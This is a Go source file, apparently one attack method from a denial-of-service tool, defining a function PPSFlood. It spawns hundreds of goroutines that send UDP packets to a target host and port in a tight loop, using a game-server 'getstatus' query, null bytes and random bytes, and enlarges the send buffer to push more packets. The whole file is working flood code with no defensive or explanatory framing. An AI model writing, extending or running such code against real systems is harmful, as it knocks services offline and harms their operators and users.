package methods

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"runtime"
	"time"
)

func PPSFlood(ctx context.Context, target string, port string, sec int) {
	fmt.Printf("[%s] PPS-ULTIMATE Attack Initializing on %s:%s\n", time.Now().Format("15:04:05"), target, port)

	addr := net.JoinHostPort(target, port)

	numWorkers := runtime.NumCPU() * 128

	payloads := [][]byte{
		[]byte("\xff\xff\xff\xffgetstatus"),
		[]byte("\x00\x00\x00\x00\x00\x00\x00\x00"),
		make([]byte, 64),
	}
	for i := range payloads[2] {
		payloads[2][i] = byte(rand.Intn(256))
	}

	for i := 0; i < numWorkers; i++ {
		go func() {
			conn, err := net.Dial("udp", addr)
			if err != nil {
				return
			}
			defer conn.Close()

			// 커널 버퍼 최적화 시도 (지원되는 경우)
			if udpConn, ok := conn.(*net.UDPConn); ok {
				udpConn.SetWriteBuffer(1024 * 1024)
			}

			for {
				select {
				case <-ctx.Done():
					return
				default:
					for j := 0; j < 1000; j++ {
						conn.Write(payloads[j%len(payloads)])
					}
				}
			}
		}()
	}

	<-ctx.Done()
	fmt.Printf("[%s] PPS-ULTIMATE Attack Finished.\n", time.Now().Format("15:04:05"))
}
